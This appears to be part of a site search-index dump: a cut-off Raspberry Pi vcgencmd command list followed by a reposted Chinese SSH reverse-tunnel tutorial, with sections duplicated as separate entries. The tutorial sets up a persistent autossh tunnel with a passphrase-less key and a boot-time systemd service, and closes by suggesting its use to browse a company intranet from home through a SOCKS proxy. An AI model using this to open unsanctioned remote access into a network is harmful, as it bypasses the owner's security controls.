vcgencmd commands \u8f38\u51fa\u6703\u985e\u4f3c\u9019\u6a23\uff1a commands=\u201dvcos, ap_output_control, ap_output_post_processing, vchi_test_init, vchi_test_exit, pm_set_policy, pm_get_status, pm_show_stats, pm_start_logging, pm_stop_logging, version, commands, set_vll_dir, led_control, set_backlight, set_logging, get_lcd_info, set_bus_arbiter_mode, cache_flush, otp_dump, test_result, codec_enabled, get_camera, get_mem, measure_clock, measure_volts, scaling_kernel, measure_temp, get_config, hdmi_ntsc_freqs, hdmi_adjust_clock, hdmi_status_show, hvs_update_fields, pwm_speedup, force_audio, hdmi_stream_channels, hdmi_channel_map, display_power, read_ring_osc, memtest, get_rsts, render_bar, disk_notify, inuse_notify, sus_suspend, sus_status, sus_is_enabled, sus_stop_test_thread, egl_platform_switch, mem_validate, mem_oom, mem_reloc_stats, file, vctest_memmap, vctest_start, vctest_stop, vctest_set, vctest_get\u201d \u9019\u4e9b\u5c31\u662f\u6240\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u53c3\u6578\uff0c\u9019\u4e9b\u53c3\u6578\u6703\u56e0\u70ba\u97cc\u9ad4\u7248\u672c\u4e0d\u540c\u800c\u6709\u5dee\u7570\u3002 \u5982\u679c\u60a8\u5c0d\u65bc\u6a39\u8393\u6d3e\u7684\u61c9\u7528\u6709\u8208\u8da3\uff0c\u5efa\u8b70\u60a8\u53ef\u4ee5\u7e7c\u7e8c\u95b1\u8b80 \u7269\u806f\u7db2 \u7684\u76f8\u95dc\u6587\u7ae0\u3002 \u53c3\u8003\u8cc7\u6599\uff1a Embedded Linux Wiki \u3001 raspberrypi.org \u3001 maketecheasier \u3001 lokir\u2019s linux notes (adsbygoogle = window.adsbygoogle || []).push({}); \u539f\u6587\u94fe\u63a5\uff1a https://blog.gtwang.org/iot/raspberry-pi-vcgencmd-hardware-information/","title":"\u67e5\u770b vcgencmd \u6240\u6709\u53ef\u7528\u7684\u53c3\u6578"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","text":"\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f ================= \u5bf9\u5e94\u7684\u60c5\u51b5 \u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u5229\u7528SSH \u53cd\u5411\u96a7\u9053\u7a7f\u900fNAT\uff0c\u5e76\u6f14\u793a\u4e86\u5982\u4f55\u7ef4\u6301\u4e00\u6761\u7a33\u5b9a\u7684SSH \u96a7\u9053\u3002 \u5047\u8bbe\u6709\u673a\u5668A \u548cB\uff0cA \u6709\u516c\u7f51IP\uff0cB \u4f4d\u4e8eNAT \u4e4b\u540e\u5e76\u65e0\u53ef\u7528\u7684\u7aef\u53e3\u8f6c\u53d1\uff0c\u73b0\u5728\u60f3\u7531A \u4e3b\u52a8\u5411B \u53d1\u8d77SSH \u8fde\u63a5\u3002\u7531\u4e8eB \u5728NAT \u540e\u7aef\uff0c\u65e0\u53ef\u7528 \u516c\u7f51IP + \u7aef\u53e3 \u8fd9\u6837\u4e00\u4e2a\u7ec4\u5408\uff0c\u6240\u4ee5A \u65e0\u6cd5\u7a7f\u900fNAT\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5e94\u5bf9\u7684\u5c31\u662f\u8fd9\u79cd\u60c5\u51b5\u3002 \u9996\u5148\u6709\u5982\u4e0b\u7ea6\u5b9a\uff0c\u56e0\u4e3a\u5f88\u91cd\u8981\u6240\u4ee5\u653e\u5728\u524d\u9762\uff1a \u673a\u5668\u4ee3\u53f7 \u673a\u5668\u4f4d\u7f6e \u5730\u5740 \u8d26\u6237 ssh/sshd \u7aef\u53e3 \u662f\u5426\u9700\u8981\u8fd0\u884csshd A \u4f4d\u4e8e\u516c\u7f51 a.site usera 22 \u662f B \u4f4d\u4e8eNAT \u4e4b\u540e localhost userb 22 \u662f C \u4f4d\u4e8eNAT \u4e4b\u540e localhost userc 22 \u5426 \u8fd9\u91cc\u9ed8\u8ba4\u4f60\u7684\u7cfb\u7edfinit \u7a0b\u5e8f\u4e3a systemd \uff0c\u5982\u679c\u4f60\u4f7f\u7528\u5176\u4ed6\u7684init \u7a0b\u5e8f\uff0c\u5982\u679c\u6ca1\u6709\u7279\u6b8a\u7406\u7531\u8fd8\u662f\u6362\u5230\u4e00\u4e2a\u73b0\u4ee3\u5316\u7684GNU/Linux \u7cfb\u7edf\u5427\u2026\u2026 SSH \u53cd\u5411\u96a7\u9053 \u8fd9\u79cd\u624b\u6bb5\u5b9e\u8d28\u4e0a\u662f\u7531B \u5411A \u4e3b\u52a8\u5730\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff0c\u53ea\u8981\u8fd9\u6761\u96a7\u9053\u4e0d\u5173\u95ed\uff0c\u8fd9\u4e2a\u8f6c\u53d1\u5c31\u662f\u6709\u6548\u7684\u3002\u6709\u4e86\u8fd9\u4e2a\u7aef\u53e3\u8f6c\u53d1\uff0c\u53ea\u9700\u8981\u8bbf\u95eeA \u76846766 \u7aef\u53e3\u53cd\u5411\u8fde\u63a5B \u5373\u53ef\u3002 \u9996\u5148\u5728 B \u4e0a\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff1a B $ ssh -p 22 -qngfNTR 6766:localhost:22 usera@a.site \u7136\u540e\u5728 A \u4e0a\u5229\u75286766 \u7aef\u53e3\u53cd\u5411SSH \u5230B\uff1a A $ ssh -p 6766 userb@localhost \u8981\u505a\u7684\u4e8b\u60c5\u5176\u5b9e\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002 \u96a7\u9053\u7684\u7ef4\u6301 \u7a33\u5b9a\u6027\u7ef4\u6301 \u7136\u800c\u4e0d\u5e78\u7684\u662fSSH \u8fde\u63a5\u662f\u4f1a\u8d85\u65f6\u5173\u95ed\u7684\uff0c\u5982\u679c\u8fde\u63a5\u5173\u95ed\uff0c\u96a7\u9053\u65e0\u6cd5\u7ef4\u6301\uff0c\u90a3\u4e48A \u5c31\u65e0\u6cd5\u5229\u7528\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT \u4e86\uff0c\u4e3a\u6b64\u6211\u4eec\u9700\u8981\u4e00\u79cd\u65b9\u6848\u6765\u63d0\u4f9b\u4e00\u6761\u7a33\u5b9a\u7684SSH \u53cd\u5411\u96a7\u9053\u3002 \u4e00\u4e2a\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f autossh \uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u4f1a\u5728\u8d85\u65f6\u4e4b\u540e\u81ea\u52a8\u91cd\u65b0\u5efa\u7acbSSH \u96a7\u9053\uff0c\u8fd9\u6837\u5c31\u89e3\u51b3\u4e86\u96a7\u9053\u7684\u7a33\u5b9a\u6027\u95ee\u9898\uff0c\u5982\u679c\u4f60\u4f7f\u7528 Arch Linux \uff0c\u4f60\u53ef\u4ee5\u8fd9\u6837\u83b7\u5f97\u5b83\uff1a $ sudo pacman -S autossh \u4e0b\u9762\u5728 B \u4e0a\u505a\u4e4b\u524d\u7c7b\u4f3c\u7684\u4e8b\u60c5\uff0c\u4e0d\u540c\u7684\u662f\u8be5\u96a7\u9053\u4f1a\u7531 autossh \u6765\u7ef4\u6301\uff1a B $ autossh -p 22 -M 6777 -NR 6766:localhost:22 usera@a.site -M \u53c2\u6570\u6307\u5b9a\u7684\u7aef\u53e3\u7528\u6765\u76d1\u542c\u96a7\u9053\u7684\u72b6\u6001\uff0c\u4e0e\u7aef\u53e3\u8f6c\u53d1\u65e0\u5173\u3002 \u4e4b\u540e\u4f60\u53ef\u4ee5\u5728A \u4e0a\u901a\u8fc76766 \u7aef\u53e3\u8bbf\u95eeB \u4e86\uff1a A $ ssh -p 6766 userb@localhost \u96a7\u9053\u7684\u81ea\u52a8\u5efa\u7acb \u7136\u800c\u8fd9\u53c8\u6709\u4e86\u53e6\u5916\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679cB \u91cd\u542f\u96a7\u9053\u5c31\u4f1a\u6d88\u5931\u3002\u90a3\u4e48\u9700\u8981\u6709\u4e00\u79cd\u624b\u6bb5\u5728B \u6bcf\u6b21\u542f\u52a8\u65f6\u4f7f\u7528 autossh \u6765\u5efa\u7acbSSH \u96a7\u9053\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u5c31\u662f\u505a\u6210\u670d\u52a1\uff0c\u4e4b\u540e\u4f1a\u7ed9\u51fa\u5728 systemd \u4e0b\u7684\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u3002 \u201c\u6253\u6d1e\u201d \u4e4b\u6240\u4ee5\u6807\u9898\u8fd9\u4e48\u8d77\uff0c\u662f\u56e0\u4e3a\u81ea\u5df1\u89c9\u5f97\u8fd9\u4ef6\u4e8b\u60c5\u6709\u70b9\u7c7b\u4f3c\u4e8eUDP \u6253\u6d1e\uff0c\u5373\u901a\u8fc7\u4e00\u53f0\u5728\u516c\u7f51\u7684\u673a\u5668\uff0c\u8ba9\u4e24\u53f0\u5206\u522b\u4f4d\u4e8e\u5404\u81eaNAT \u4e4b\u540e\u7684\u673a\u5668\u53ef\u4ee5\u5efa\u7acbSSH \u8fde\u63a5\u3002 \u4e0b\u9762\u6f14\u793a\u5982\u4f55\u4f7f\u7528SSH \u53cd\u5411\u96a7\u9053\uff0c\u8ba9C \u8fde\u63a5\u5230B\u3002 \u9996\u5148\u5728 A \u4e0a\u7f16\u8f91 sshd \u7684\u914d\u7f6e\u6587\u4ef6 /etc/ssh/sshd_config \uff0c\u5c06 GatewayPorts \u5f00\u5173\u6253\u5f00\uff1a GatewayPorts yes \u7136\u540e\u91cd\u542f sshd \uff1a A $ sudo systemctl restart sshd \u7136\u540e\u5728 B \u4e0a\u5bf9\u4e4b\u524d\u7528\u5230\u7684 autossh \u6307\u4ee4\u7565\u52a0\u4fee\u6539\uff1a B $ autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site \u4e4b\u540e\u5728 C \u4e0a\u5229\u7528 A \u76846766 \u7aef\u53e3SSH \u8fde\u63a5\u5230 B \uff1a C $ ssh -p 6766 userb@a.site \u81f3\u6b64\u4f60\u5df2\u7ecf\u8f7b\u800c\u6613\u4e3e\u7684\u7a7f\u900f\u4e86\u4e24\u5c42NAT\u3002 \u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848 \u6574\u5408\u4e00\u4e0b\u524d\u9762\u63d0\u5230\u7684\uff0c\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u9996\u5148\u6253\u5f00 A \u4e0a sshd \u7684 GatewayPorts \u5f00\u5173\uff0c\u5e76\u91cd\u542f sshd \uff08\u5982\u6709\u9700\u8981\uff09\u3002 \u7136\u540e\u5728 B \u4e0a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237 autossh \uff0c\u6839\u636e\u6743\u9650\u6700\u5c0f\u5316\u601d\u60f3\uff0cB \u4e0a\u7684 autossh \u670d\u52a1\u5c06\u4ee5 autossh \u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\uff0c\u4ee5\u5c3d\u5927\u53ef\u80fd\u907f\u514d\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff1a B $ sudo useradd -m autosshB $ sudo passwd autossh \u7d27\u63a5\u7740\u5728 B \u4e0a\u4e3a autossh \u7528\u6237\u521b\u5efaSSH \u5bc6\u94a5\uff0c\u5e76\u4e0a\u4f20\u5230A\uff1a B $ su - autosshB $ ssh-keygen -t 'rsa' -C 'autossh@B'B $ ssh-copy-id usera@a.site \u6ce8\u610f\u8be5 \u5bc6\u94a5\u4e0d\u8981\u8bbe\u7f6e\u5bc6\u7801 \uff0c\u4e5f\u5c31\u662f\u8fd0\u884c ssh-keygen \u6307\u4ee4\u65f6\u5c3d\u7ba1\u4e00\u8def\u56de\u8f66\uff0c\u4e0d\u8981\u8f93\u5165\u989d\u5916\u7684\u5b57\u7b26\u3002 \u7136\u540e\u5728 B \u4e0a\u521b\u5efa\u4ee5 autossh \u7528\u6237\u6743\u9650\u8c03\u7528 autossh \u7684service \u6587\u4ef6\u3002\u5c06\u4e0b\u9762\u6587\u672c\u5199\u5165\u5230\u6587\u4ef6 /lib/systemd/system/autossh.service \uff0c\u5e76\u8bbe\u7f6e\u6743\u9650\u4e3a644\uff1a [Unit]Description=Auto SSH TunnelAfter=network-online.target[Service]User=autosshType=simpleExecStart=/bin/autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site -i /home/autossh/.ssh/id_rsaExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always[Install]WantedBy=multi-user.targetWantedBy=graphical.target \u5728B \u4e0a\u8ba9 network-online.target \u751f\u6548\uff1a B $ systemctl enable NetworkManager-wait-online \u5982\u679c\u4f60\u4f7f\u7528 systemd-networkd \uff0c\u4f60\u9700\u8981\u542f\u7528\u7684\u670d\u52a1\u5219\u5e94\u5f53\u662f systemd-networkd-wait-online \u3002 \u7136\u540e\u8bbe\u7f6e\u8be5\u670d\u52a1\u81ea\u52a8\u542f\u52a8\uff1a B $ sudo systemctl enable autossh \u5982\u679c\u4f60\u613f\u610f\uff0c\u5728\u8fd9\u4e4b\u540e\u53ef\u4ee5\u7acb\u523b\u542f\u52a8\u5b83\uff1a B $ sudo systemctl start autossh \u7136\u540e\u4f60\u53ef\u4ee5\u5728 A \u4e0a\u4f7f\u7528\u8fd9\u6761\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT SSH \u8fde\u63a5\u5230B\uff1a A $ ssh -p 6766 userb@localhost \u6216\u8005\u662f\u5728 C \u4e0a\u76f4\u63a5\u7a7f\u900f\u4e24\u5c42NAT SSH \u8fde\u63a5\u5230B\uff1a C $ ssh -p 6766 userb@a.site \u5982\u679c\u4f60\u5bf9SSH \u8db3\u591f\u719f\u6089\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u6761\u96a7\u9053\u505a\u66f4\u591a\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\u4f60\u53ef\u4ee5\u5728\u53cd\u5411\u8fde\u63a5\u65f6\u6307\u5b9a\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\uff1a C $ ssh -p 6766 -qngfNTD 7677 userb@a.site \u5047\u8bbe C \u662f\u4f60\u5bb6\u4e2d\u7684\u7535\u8111\uff0c A \u662f\u4f60\u7684VPS\uff0c B \u662f\u4f60\u516c\u53f8\u7684\u7535\u8111\u3002\u5982\u679c\u4f60\u8fd9\u6837\u505a\u4e86\uff0c\u90a3\u4e48\u4e3a\u6d4f\u89c8\u5668\u8bbe\u7f6e\u7aef\u53e3\u4e3a 7677 \u7684 sock4 \u672c\u5730\uff08localhost\uff09\u4ee3\u7406\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728\u5bb6\u91cc\u7684\u6d4f\u89c8\u5668\u4e0a\u770b\u5230\u516c\u53f8\u5185\u7f51\u7684\u7f51\u9875\u3002 \u672c\u6587\u6807\u9898: \u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f \u539f\u6587\u94fe\u63a5\uff1a http://arondight.me/2016/02/17/\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f/","title":"\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#ssh","text":"=================","title":"\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_1","text":"\u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u5229\u7528SSH \u53cd\u5411\u96a7\u9053\u7a7f\u900fNAT\uff0c\u5e76\u6f14\u793a\u4e86\u5982\u4f55\u7ef4\u6301\u4e00\u6761\u7a33\u5b9a\u7684SSH \u96a7\u9053\u3002 \u5047\u8bbe\u6709\u673a\u5668A \u548cB\uff0cA \u6709\u516c\u7f51IP\uff0cB \u4f4d\u4e8eNAT \u4e4b\u540e\u5e76\u65e0\u53ef\u7528\u7684\u7aef\u53e3\u8f6c\u53d1\uff0c\u73b0\u5728\u60f3\u7531A \u4e3b\u52a8\u5411B \u53d1\u8d77SSH \u8fde\u63a5\u3002\u7531\u4e8eB \u5728NAT \u540e\u7aef\uff0c\u65e0\u53ef\u7528 \u516c\u7f51IP + \u7aef\u53e3 \u8fd9\u6837\u4e00\u4e2a\u7ec4\u5408\uff0c\u6240\u4ee5A \u65e0\u6cd5\u7a7f\u900fNAT\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5e94\u5bf9\u7684\u5c31\u662f\u8fd9\u79cd\u60c5\u51b5\u3002 \u9996\u5148\u6709\u5982\u4e0b\u7ea6\u5b9a\uff0c\u56e0\u4e3a\u5f88\u91cd\u8981\u6240\u4ee5\u653e\u5728\u524d\u9762\uff1a \u673a\u5668\u4ee3\u53f7 \u673a\u5668\u4f4d\u7f6e \u5730\u5740 \u8d26\u6237 ssh/sshd \u7aef\u53e3 \u662f\u5426\u9700\u8981\u8fd0\u884csshd A \u4f4d\u4e8e\u516c\u7f51 a.site usera 22 \u662f B \u4f4d\u4e8eNAT \u4e4b\u540e localhost userb 22 \u662f C \u4f4d\u4e8eNAT \u4e4b\u540e localhost userc 22 \u5426 \u8fd9\u91cc\u9ed8\u8ba4\u4f60\u7684\u7cfb\u7edfinit \u7a0b\u5e8f\u4e3a systemd \uff0c\u5982\u679c\u4f60\u4f7f\u7528\u5176\u4ed6\u7684init \u7a0b\u5e8f\uff0c\u5982\u679c\u6ca1\u6709\u7279\u6b8a\u7406\u7531\u8fd8\u662f\u6362\u5230\u4e00\u4e2a\u73b0\u4ee3\u5316\u7684GNU/Linux \u7cfb\u7edf\u5427\u2026\u2026","title":"\u5bf9\u5e94\u7684\u60c5\u51b5"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#ssh_1","text":"\u8fd9\u79cd\u624b\u6bb5\u5b9e\u8d28\u4e0a\u662f\u7531B \u5411A \u4e3b\u52a8\u5730\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff0c\u53ea\u8981\u8fd9\u6761\u96a7\u9053\u4e0d\u5173\u95ed\uff0c\u8fd9\u4e2a\u8f6c\u53d1\u5c31\u662f\u6709\u6548\u7684\u3002\u6709\u4e86\u8fd9\u4e2a\u7aef\u53e3\u8f6c\u53d1\uff0c\u53ea\u9700\u8981\u8bbf\u95eeA \u76846766 \u7aef\u53e3\u53cd\u5411\u8fde\u63a5B \u5373\u53ef\u3002 \u9996\u5148\u5728 B \u4e0a\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff1a B $ ssh -p 22 -qngfNTR 6766:localhost:22 usera@a.site \u7136\u540e\u5728 A \u4e0a\u5229\u75286766 \u7aef\u53e3\u53cd\u5411SSH \u5230B\uff1a A $ ssh -p 6766 userb@localhost \u8981\u505a\u7684\u4e8b\u60c5\u5176\u5b9e\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002","title":"SSH \u53cd\u5411\u96a7\u9053"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_2","text":"","title":"\u96a7\u9053\u7684\u7ef4\u6301"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_3","text":"\u7136\u800c\u4e0d\u5e78\u7684\u662fSSH \u8fde\u63a5\u662f\u4f1a\u8d85\u65f6\u5173\u95ed\u7684\uff0c\u5982\u679c\u8fde\u63a5\u5173\u95ed\uff0c\u96a7\u9053\u65e0\u6cd5\u7ef4\u6301\uff0c\u90a3\u4e48A \u5c31\u65e0\u6cd5\u5229\u7528\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT \u4e86\uff0c\u4e3a\u6b64\u6211\u4eec\u9700\u8981\u4e00\u79cd\u65b9\u6848\u6765\u63d0\u4f9b\u4e00\u6761\u7a33\u5b9a\u7684SSH \u53cd\u5411\u96a7\u9053\u3002 \u4e00\u4e2a\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f autossh \uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u4f1a\u5728\u8d85\u65f6\u4e4b\u540e\u81ea\u52a8\u91cd\u65b0\u5efa\u7acbSSH \u96a7\u9053\uff0c\u8fd9\u6837\u5c31\u89e3\u51b3\u4e86\u96a7\u9053\u7684\u7a33\u5b9a\u6027\u95ee\u9898\uff0c\u5982\u679c\u4f60\u4f7f\u7528 Arch Linux \uff0c\u4f60\u53ef\u4ee5\u8fd9\u6837\u83b7\u5f97\u5b83\uff1a $ sudo pacman -S autossh \u4e0b\u9762\u5728 B \u4e0a\u505a\u4e4b\u524d\u7c7b\u4f3c\u7684\u4e8b\u60c5\uff0c\u4e0d\u540c\u7684\u662f\u8be5\u96a7\u9053\u4f1a\u7531 autossh \u6765\u7ef4\u6301\uff1a B $ autossh -p 22 -M 6777 -NR 6766:localhost:22 usera@a.site -M \u53c2\u6570\u6307\u5b9a\u7684\u7aef\u53e3\u7528\u6765\u76d1\u542c\u96a7\u9053\u7684\u72b6\u6001\uff0c\u4e0e\u7aef\u53e3\u8f6c\u53d1\u65e0\u5173\u3002 \u4e4b\u540e\u4f60\u53ef\u4ee5\u5728A \u4e0a\u901a\u8fc76766 \u7aef\u53e3\u8bbf\u95eeB \u4e86\uff1a A $ ssh -p 6766 userb@localhost","title":"\u7a33\u5b9a\u6027\u7ef4\u6301"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_4","text":"\u7136\u800c\u8fd9\u53c8\u6709\u4e86\u53e6\u5916\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679cB \u91cd\u542f\u96a7\u9053\u5c31\u4f1a\u6d88\u5931\u3002\u90a3\u4e48\u9700\u8981\u6709\u4e00\u79cd\u624b\u6bb5\u5728B \u6bcf\u6b21\u542f\u52a8\u65f6\u4f7f\u7528 autossh \u6765\u5efa\u7acbSSH \u96a7\u9053\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u5c31\u662f\u505a\u6210\u670d\u52a1\uff0c\u4e4b\u540e\u4f1a\u7ed9\u51fa\u5728 systemd \u4e0b\u7684\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u3002","title":"\u96a7\u9053\u7684\u81ea\u52a8\u5efa\u7acb"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_5","text":"\u4e4b\u6240\u4ee5\u6807\u9898\u8fd9\u4e48\u8d77\uff0c\u662f\u56e0\u4e3a\u81ea\u5df1\u89c9\u5f97\u8fd9\u4ef6\u4e8b\u60c5\u6709\u70b9\u7c7b\u4f3c\u4e8eUDP \u6253\u6d1e\uff0c\u5373\u901a\u8fc7\u4e00\u53f0\u5728\u516c\u7f51\u7684\u673a\u5668\uff0c\u8ba9\u4e24\u53f0\u5206\u522b\u4f4d\u4e8e\u5404\u81eaNAT \u4e4b\u540e\u7684\u673a\u5668\u53ef\u4ee5\u5efa\u7acbSSH \u8fde\u63a5\u3002 \u4e0b\u9762\u6f14\u793a\u5982\u4f55\u4f7f\u7528SSH \u53cd\u5411\u96a7\u9053\uff0c\u8ba9C \u8fde\u63a5\u5230B\u3002 \u9996\u5148\u5728 A \u4e0a\u7f16\u8f91 sshd \u7684\u914d\u7f6e\u6587\u4ef6 /etc/ssh/sshd_config \uff0c\u5c06 GatewayPorts \u5f00\u5173\u6253\u5f00\uff1a GatewayPorts yes \u7136\u540e\u91cd\u542f sshd \uff1a A $ sudo systemctl restart sshd \u7136\u540e\u5728 B \u4e0a\u5bf9\u4e4b\u524d\u7528\u5230\u7684 autossh \u6307\u4ee4\u7565\u52a0\u4fee\u6539\uff1a B $ autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site \u4e4b\u540e\u5728 C \u4e0a\u5229\u7528 A \u76846766 \u7aef\u53e3SSH \u8fde\u63a5\u5230 B \uff1a C $ ssh -p 6766 userb@a.site \u81f3\u6b64\u4f60\u5df2\u7ecf\u8f7b\u800c\u6613\u4e3e\u7684\u7a7f\u900f\u4e86\u4e24\u5c42NAT\u3002","title":"\u201c\u6253\u6d1e\u201d"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_6","text":"\u6574\u5408\u4e00\u4e0b\u524d\u9762\u63d0\u5230\u7684\uff0c\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u9996\u5148\u6253\u5f00 A \u4e0a sshd \u7684 GatewayPorts \u5f00\u5173\uff0c\u5e76\u91cd\u542f sshd \uff08\u5982\u6709\u9700\u8981\uff09\u3002 \u7136\u540e\u5728 B \u4e0a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237 autossh \uff0c\u6839\u636e\u6743\u9650\u6700\u5c0f\u5316\u601d\u60f3\uff0cB \u4e0a\u7684 autossh \u670d\u52a1\u5c06\u4ee5 autossh \u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\uff0c\u4ee5\u5c3d\u5927\u53ef\u80fd\u907f\u514d\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff1a B $ sudo useradd -m autosshB $ sudo passwd autossh \u7d27\u63a5\u7740\u5728 B \u4e0a\u4e3a autossh \u7528\u6237\u521b\u5efaSSH \u5bc6\u94a5\uff0c\u5e76\u4e0a\u4f20\u5230A\uff1a B $ su - autosshB $ ssh-keygen -t 'rsa' -C 'autossh@B'B $ ssh-copy-id usera@a.site \u6ce8\u610f\u8be5 \u5bc6\u94a5\u4e0d\u8981\u8bbe\u7f6e\u5bc6\u7801 \uff0c\u4e5f\u5c31\u662f\u8fd0\u884c ssh-keygen \u6307\u4ee4\u65f6\u5c3d\u7ba1\u4e00\u8def\u56de\u8f66\uff0c\u4e0d\u8981\u8f93\u5165\u989d\u5916\u7684\u5b57\u7b26\u3002 \u7136\u540e\u5728 B \u4e0a\u521b\u5efa\u4ee5 autossh \u7528\u6237\u6743\u9650\u8c03\u7528 autossh \u7684service \u6587\u4ef6\u3002\u5c06\u4e0b\u9762\u6587\u672c\u5199\u5165\u5230\u6587\u4ef6 /lib/systemd/system/autossh.service \uff0c\u5e76\u8bbe\u7f6e\u6743\u9650\u4e3a644\uff1a [Unit]Description=Auto SSH TunnelAfter=network-online.target[Service]User=autosshType=simpleExecStart=/bin/autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site -i /home/autossh/.ssh/id_rsaExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always[Install]WantedBy=multi-user.targetWantedBy=graphical.target \u5728B \u4e0a\u8ba9 network-online.target \u751f\u6548\uff1a B $ systemctl enable NetworkManager-wait-online \u5982\u679c\u4f60\u4f7f\u7528 systemd-networkd \uff0c\u4f60\u9700\u8981\u542f\u7528\u7684\u670d\u52a1\u5219\u5e94\u5f53\u662f systemd-networkd-wait-online \u3002 \u7136\u540e\u8bbe\u7f6e\u8be5\u670d\u52a1\u81ea\u52a8\u542f\u52a8\uff1a B $ sudo systemctl enable autossh \u5982\u679c\u4f60\u613f\u610f\uff0c\u5728\u8fd9\u4e4b\u540e\u53ef\u4ee5\u7acb\u523b\u542f\u52a8\u5b83\uff1a B $ sudo systemctl start autossh \u7136\u540e\u4f60\u53ef\u4ee5\u5728 A \u4e0a\u4f7f\u7528\u8fd9\u6761\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT SSH 